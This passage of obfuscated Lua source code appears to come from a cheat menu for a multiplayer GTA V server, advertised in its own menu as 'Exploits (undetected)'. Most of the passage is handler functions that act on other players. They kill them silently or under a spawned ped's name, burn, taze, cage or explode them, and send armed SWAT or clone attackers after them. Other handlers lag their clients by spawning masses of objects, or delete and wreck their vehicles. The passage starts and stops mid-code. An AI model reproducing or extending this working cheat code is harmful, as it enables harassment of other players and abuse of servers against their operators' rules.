                            {text = 'Exploits (undetected)', dkey = 'server:targetinglist:exploits', desc = 'Exploits menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:exploits'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Vehicle', dkey = 'server:targetinglist:vehicle', desc = 'Vehicle menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:vehicle'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Weapon', dkey = 'server:targetinglist:weapon', desc = 'Weapon menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:weapon'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Sound', dkey = 'server:targetinglist:sound', desc = 'Sound menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:sound'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Explode', dkey = 'server:targetinglist:explosion', desc = 'Explode menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:explosion'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Trigger', dkey = 'server:targetinglist:trigger', desc = 'Trigger menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:trigger'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Particle', dkey = 'server:targetinglist:particle', desc = 'Particle menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:particle'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'Attach', dkey = 'server:targetinglist:attach', desc = 'Attach menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:attach'}, lasto = 1, scrollo = 0, addedo = 0},
                            {text = 'General', option = __REAPER1__.M.Separator},
                            {text = 'Kill', dkey = 'server:targetinglist_kill', desc = 'Kill the players silently or under your\nname.', afu = __REAPER1__.M.tlist.kill, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Kill type', length = 10, tipus = 'betu', func = {'Normal', 'Silent'}},
                            {text = 'Taze', dkey = 'server:targetinglist_taze', desc = 'Taze the players.', afu = __REAPER1__.M.tlist.taze, option = __REAPER1__.M.Button},
                            {text = 'Burn', dkey = 'server:targetinglist_burn', desc = 'Burn the players.', afu = __REAPER1__.M.tlist.burn, option = __REAPER1__.M.Button},
                            {text = 'Cage', dkey = 'server:targetinglist_cage', desc = 'Toggle the cage on the players.', afu = __REAPER1__.M.tlist.cage, option = __REAPER1__.M.Checkbox, func = false},
                            {text = 'Demi god', dkey = 'server:targetinglist_demigod', desc = 'Toggle the demi god mode on the players.', afu = __REAPER1__.M.tlist.demigod, option = __REAPER1__.M.Checkbox, func = false},
                            {text = 'Alpha', dkey = 'server:targetinglist_alpha', desc = 'Set the players\'s alpha.', afu = __REAPER1__.M.tlist.alpha, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.AlphaValues},
                            {text = 'Bring vehicles', dkey = 'server:targetinglist_vehtome', desc = 'Teleport the players\'s vehicle to me.', afu = __REAPER1__.M.tlist.vehtome, option = __REAPER1__.M.Button},
                            {text = 'Peds', option = __REAPER1__.M.Separator},
                            {text = 'Clone', dkey = 'server:targetinglist_clone', desc = 'Clone the players.', afu = __REAPER1__.M.tlist.clone, option = __REAPER1__.M.Button},
                            {text = 'Attack by clones', dkey = 'server:targetinglist_attackbyclones', desc = 'Attack the players by their clones.', afu = __REAPER1__.M.tlist.attackc, option = __REAPER1__.M.Button},
                            {text = 'Attack by SWAT', dkey = 'server:targetinglist_attackbyswat', desc = 'Attack the players by a SWAT team.', afu = __REAPER1__.M.tlist.attacks, option = __REAPER1__.M.Button},
                            {text = 'Spawn bodyguards', dkey = 'server:targetinglist_spawnbodyguard', desc = 'Spawn bodyguards for the players.', afu = __REAPER1__.M.tlist.bodyg, option = __REAPER1__.M.Button},
                        }
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist']) do
                            if k ~= 1 and v.dkey then
                                __REAPER1__.A[v.dkey] = v
                            end
                        end
                    end
                else
                    for k,v in ipairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        if v.dkey == 'server:targetinglist:targetedplayers' .. p6 then
                            table.remove(__REAPER1__.T.Display['server:targetinglist:targetedplayers'], k)
                            break
                        end
                    end

                    if __REAPER1__.T.Display['server:targetinglist:targetedplayers'][1] == nil then
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist']) do
                            if k ~= 1 and v.dkey then
                                __REAPER1__.A[v.dkey] = nil
                            end
                        end
                        __REAPER1__.T.Display['server:targetinglist'] = {{text = 'Targeted players', dkey = 'server:targetinglist:targetedplayers', desc = 'Targeted players menu.', option = __REAPER1__.M.Menu_Button, func = {'server:targetinglist', 'server:targetinglist:targetedplayers'}, lasto = 1, scrollo = 0, addedo = 0}}
                    end
                end
            end,
            spectate = function(p1, p2, p3, p4, p5, p6, p7)
                local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                __REAPER1__.N.SpectatingCam(p2, __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)))
                __REAPER1__.F.LoopedPlayer('spec', p6, string.sub(p1, 0, a2 + 1), p2)
                if p2 then
                    __REAPER1__.V.SpectatingId = p6
                end
            end,
            blamedrag = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                if p2 and ped ~= __REAPER1__.V.SelfPed then
                    __REAPER1__.N.AttachEntityToEntity(__REAPER1__.V.SelfPed, ped, 11816, 0.54, 0.54, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                elseif not p2 and ped ~= __REAPER1__.V.SelfPed then
                    __REAPER1__.N.DetachEntity(__REAPER1__.V.SelfPed, 0, true)
                end
            end,
            kill = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                if p4 == 1 then
                    local coords = __REAPER1__.N.GetEntityCoords(ped)
                    __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, __REAPER1__.V.SelfPed, false, true, 999999999, false, false, 0)
                else
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                            local coords, coords2 = __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                            local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords2.x, coords2.y, coords2.z - 50.0, 0.0, true, true)
                            __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, sped, false, true, 999999999, false, false, 0)
                            __REAPER1__.N.DeleteEntity(sped)
                        end
                    end)
                end
            end,
            taze = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                __REAPER25__(function()
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                    local coords, coords2 = __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                        local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords2.x, coords2.y, coords2.z - 50.0, 0.0, true, true)
                        __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 0.0, true, `WEAPON_STUNGUN`, sped, false, true, 999999999, false, false, 0)
                        __REAPER1__.N.DeleteEntity(sped)
                    end
                end)
            end,
            burn = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    for i = 1, 50 do
                        local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 0.0, 1.0, 0.0)
                        __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                    end
                end)
            end,
            launch = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if not __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        if __REAPER1__.F.RequestEntity(`prop_fnccorgm_06b`) then
                            local obj = __REAPER1__.N.CreateObject(`prop_fnccorgm_06b`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 1.0, -1.0, -1.0), true, true, false)
                            __REAPER1__.N.SetEntityVisible(obj, false)
                            __REAPER1__.N.SetEntityRotation(obj, -90.0, 0, __REAPER1__.N.GetEntityHeading(ped), 1)
                            __REAPER1__.N.ApplyForceToEntity(obj, 1, 0, 0, 100.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
                            __REAPER26__(500)
                            __REAPER1__.N.DeleteEntity(obj)
                        end
                    else
                        __REAPER1__.F.AddNotification('Player is in a vehicle. Use: Vehicle > Launch.', 5000, 210, 210, 0)
                    end
                end)
            end,
            cage = function(p1, p2, p3, p4, p5, p6, p7)
                local pid = __REAPER1__.N.GetPlayerFromServerId(p6)
                local ped = __REAPER1__.N.GetPlayerPed(pid)
                if p2 then
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER1__.F.AddNotification('Can\'t cage players in vehicles.', 5000, 210, 210, 0)
                    else
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`prop_facgate_02_l`) then
                                local head = __REAPER1__.N.GetEntityHeading(ped)
                                __REAPER1__.T.Cage[pid .. 'obj1'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, 0.5, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj2'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj3'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 0.4, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[pid .. 'obj4'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -0.5, -1.0), true, true, false)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj1'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj2'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj3'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[pid .. 'obj4'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj1'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj2'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj3'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[pid .. 'obj4'], true)
                            end
                        end)
                    end
                else
                    __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj1'])
                    __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj2'])
                    __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj3'])
                    __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[pid .. 'obj4'])
                    __REAPER1__.T.Cage[pid .. 'obj1'], __REAPER1__.T.Cage[pid .. 'obj2'], __REAPER1__.T.Cage[pid .. 'obj3'], __REAPER1__.T.Cage[pid .. 'obj4'] = nil, nil, nil, nil
                end
            end,
            demigod = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local pid = __REAPER1__.N.GetPlayerFromServerId(p6)
                    if not p2 then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.T.PlyDemigod[pid])
                        __REAPER1__.T.PlyDemigod[pid] = nil
                    else
                        if __REAPER1__.F.RequestEntity(`prop_juicestand`) then
                            local ped = __REAPER1__.N.GetPlayerPed(pid)
                            __REAPER1__.T.PlyDemigod[pid] = __REAPER1__.N.CreateObject(`prop_juicestand`, __REAPER1__.N.GetEntityCoords(ped), true, true, false)
                            __REAPER1__.N.AttachEntityToEntity(__REAPER1__.T.PlyDemigod[pid], ped, __REAPER1__.N.GetPedBoneIndex(ped, 57005), 0, 0, 0, 0, 0, 0, false, false, false, true, 1, true)
                            __REAPER1__.N.SetEntityProofs(__REAPER1__.T.PlyDemigod[pid], true, true, true, true, true, true, true, false)
                            __REAPER1__.N.SetEntityVisible(__REAPER1__.T.PlyDemigod[pid], false)
                        end
                    end
                end)
            end,
            alpha = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityAlpha(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), p2[p4], false)
            end,
            coutfit = function(p1, p2, p3, p4, p5, p6, p7)
                local fit = __REAPER1__.N.CopyOutfit(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)))
                __REAPER1__.N.SetOutfit(__REAPER1__.V.SelfPed, fit)
            end,
            coutfitped = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClonePedToTarget(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), __REAPER1__.V.SelfPed)
            end,
            toply = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))), false, false, false)
            end,
            around = function(p1, p2, p3, p4, p5, p6, p7)
                local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)))
                local x, y = coords.x + math.random(50, 200), coords.y + math.random(50, 200)
                local ground, groundZPos = __REAPER1__.N.GetGroundZFor_3dCoord(x, y, coords.z + 1000.0, 0)
                if ground then
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, x, y, groundZPos + 1.0, true, true ,true)
                end
            end,
            inveh = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                    local veh =__REAPER1__.N.GetVehiclePedIsIn(ped, false)
                    __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, veh, -2)
                else
                    __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                end
            end,
            vehtome = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                    local entity =__REAPER1__.N.GetVehiclePedIsIn(ped, false)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(entity) then
                            __REAPER1__.N.SetEntityCoordsNoOffset(entity, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true ,true)
                        end
                    end)
                else
                    __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                end
            end,
            clone = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClonePed(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), __REAPER1__.N.GetEntityHeading(__REAPER1__.N.GetPlayerPed(p6)), true, true)
            end,
            hostileped = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                    if v ~= __REAPER1__.V.SelfPed and not __REAPER1__.N.IsPedInAnyVehicle(v, false) and not __REAPER1__.N.IsPedAPlayer(v) then
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetRelationshipBetweenGroups(5, `PLAYER`, __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(v)))
                                __REAPER1__.N.SetRelationshipBetweenGroups(5, __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(v)), `PLAYER`)
                                __REAPER1__.N.TaskCombatPed(v, __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), 0, 16)
                            end
                        end)
                    end
                end
            end,
            hostileveh = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                    if v ~= __REAPER1__.V.SelfPed and __REAPER1__.N.IsPedInAnyVehicle(v, false) and not __REAPER1__.N.IsPedAPlayer(v) then
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetRelationshipBetweenGroups(5, `PLAYER`, __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(v)))
                                __REAPER1__.N.SetRelationshipBetweenGroups(5, __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(v)), `PLAYER`)
                                __REAPER1__.N.TaskCombatPed(v, __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), 0, 16)
                            end
                        end)
                    end
                end
            end,
            attackc = function(p1, p2, p3, p4, p5, p6, p7)
                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                for i = 1, math.random(3, 10) do
                    local clone = __REAPER1__.N.ClonePed(ped, __REAPER1__.N.GetEntityHeading(ped), true, true)
                    __REAPER1__.N.GiveWeaponToPed(clone, `WEAPON_KNIFE` , 9999, false, true)
                    __REAPER1__.N.TaskCombatPed(clone, ped, 0, 16)
                end
            end,
            attacks = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.F.RequestEntity(`s_m_y_swat_01`) then
                        for i = 1, math.random(3, 10) do
                            local swat = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('s_m_y_swat_01'), `s_m_y_swat_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                            __REAPER1__.N.GiveWeaponToPed(swat, `WEAPON_CARBINERIFLE` , 9999, false, true)
                            __REAPER1__.N.TaskCombatPed(swat, ped, 0, 16)
                        end
                    end
                end)
            end,
            bodyg = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.F.RequestEntity(`ig_fbisuit_01`) then
                        __REAPER1__.N.SetPedAsGroupLeader(ped, __REAPER1__.N.GetPlayerGroup(ped))
                        for i = 1, math.random(3, 10) do
                            local bodyg = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('ig_fbisuit_01'), `ig_fbisuit_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                            __REAPER1__.N.GiveWeaponToPed(bodyg, `WEAPON_COMPACTRIFLE` , 9999, false, true)
                            local relationGroup = __REAPER1__.N.GetHashKey(__REAPER1__.N.GetPedRelationshipGroupHash(bodyg))
                            __REAPER1__.N.SetPedAsGroupMember(bodyg, __REAPER1__.N.GetPlayerGroup(ped))
                            __REAPER1__.N.SetPedNeverLeavesGroup(bodyg, true)
                            __REAPER1__.N.SetRelationshipBetweenGroups(0, `PLAYER`, relationGroup)
                            __REAPER1__.N.SetRelationshipBetweenGroups(0, relationGroup, `PLAYER`)
                            __REAPER1__.N.SetRelationshipBetweenGroups(1, `PLAYER`, relationGroup)
                            __REAPER1__.N.SetRelationshipBetweenGroups(1, relationGroup, `PLAYER`)
                            __REAPER1__.N.SetCanAttackFriendly(bodyg, false, false)
                            __REAPER1__.N.TaskFollowToOffsetOfEntity(bodyg, ped, 0.0, 0.0, 0.0, 30.0, -1, 50.0, 1)
                        end
                    end
                end)
            end,
            exploits = {
                bugveh = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`prop_cigar_02`) then
                                local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                                local ent = __REAPER1__.N.CreateObject(`prop_cigar_02`, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                __REAPER1__.N.AttachEntityToEntity(ent, ped, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 0, true)
                                __REAPER1__.T.Bugveh[p6] = ent
                            end
                        end)
                    else
                        __REAPER1__.N.DeleteEntity(__REAPER1__.T.Bugveh[p6])
                        __REAPER1__.T.Bugveh[p6] = nil
                    end
                end,
                cleanup = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.T.Lagply[p6] then
                        for k,v in ipairs(__REAPER1__.T.Lagply[p6]) do
                            __REAPER1__.N.DeleteEntity(v)
                        end

                        __REAPER1__.T.Lagply[p6] = nil
                        __REAPER1__.F.AddNotification('Cleaned up vehicles.', 3000, 200, 200, 200)
                    end
                end,
                lag = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p7) then
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))

                            local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                            local t = string.sub(p1, 0, a2 + 1)

                            for i = 1, __REAPER1__.A[t .. '_lagamount'].sindex do
                                local ent = __REAPER1__.N.CreateObject(p7, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                if not __REAPER1__.T.Lagply[p6] then
                                    __REAPER1__.T.Lagply[p6] = {ent}
                                else
                                    table.insert(__REAPER1__.T.Lagply[p6], ent)
                                end

                                __REAPER26__(5)
                            end
                        end
                    end)
                end
            },
            explosion = {
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))), __REAPER1__.A[t .. '_type'].sindex - 1, __REAPER1__.F.IntToFloat(__REAPER1__.A[t .. '_damage'].sindex - 1), __REAPER1__.A[t .. '_audible'].func, __REAPER1__.A[t .. '_invisible'].func, true)
                end,
                lexplode = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('exploding', p6, string.sub(p1, 0, a2 + 1))
                end,
            },
            vehicle = {
                deletevehicle = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.N.GetVehiclePedIsIn(ped))
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                deleteinrange = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))

                    for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                        if #(__REAPER1__.N.GetEntityCoords(v) - __REAPER1__.N.GetEntityCoords(ped)) < p4 then
                            __REAPER1__.N.DeleteEntity(v)
                        end
                    end
                end,
                launchveh = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))

                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.ApplyForceToEntity(veh, 1, 0, 0, __REAPER1__.F.IntToFloat(p4 * 1000), 1.0, 0.0, 0.0, 1, false, true, false, false)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.RemoveWheel(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                setspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.SetVehicleForwardSpeed(veh, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                cloneveh = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                        __REAPER1__.N.CloneVehicle(veh, __REAPER1__.N.GetEntityCoords(veh), __REAPER1__.N.GetEntityHeading(veh), true, true)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.FreezeEntityPosition(veh, p2)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.FuckUpVeh(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                tune = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.TuneVehicle(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                downgrade = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.DowngradeVeh(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                fix = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.FixVehicle(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                randomize = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
